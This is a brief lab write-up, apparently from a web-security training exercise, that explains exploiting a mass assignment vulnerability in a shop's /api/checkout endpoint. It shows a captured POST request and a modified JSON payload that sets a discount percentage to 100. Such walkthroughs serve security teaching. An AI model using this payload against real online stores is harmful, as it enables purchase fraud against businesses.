##Exploiting a mass assignment vulnerability

Steps:
1-recon to found out api endpoint
  .check /api 
  ==> result:
REST API
Verb	Endpoint	Parameters	Response
POST	/checkout	{"order": Order}	201 Created, Location header
GET	/checkout	{ }	200 OK, Order

2-check endpoint /api/checkout
result==>
{"chosen_discount":{"percentage":0},"chosen_products":[]}

if take "chosen_discount":{"percentage":0} and change it into
"percentage":100
and post request then we get 100 discount 


what is idea:

when we request to checkout the product 
note this request

POST /api/checkout HTTP/2
Host: 0a40003f03ab44e781207a6500640037.web-security-academy.net
Cookie: session=Fseqz7kJE2isZvaZuTU05gbbB9mNmxgk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a40003f03ab44e781207a6500640037.web-security-academy.net/cart
Content-Type: text/plain;charset=UTF-8
Content-Length: 53
Origin: https://0a40003f03ab44e781207a6500640037.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"chosen_products":[{"product_id":"1","quantity":1}]}

if we change chosen_id the server will check all paramater in request and excute them
so we can exploit this by add

payload
==>{"chosen_products":[{"product_id":"1","quantity":1}],"chosen_discount":{"percentage":100}} will verify this and apply discount

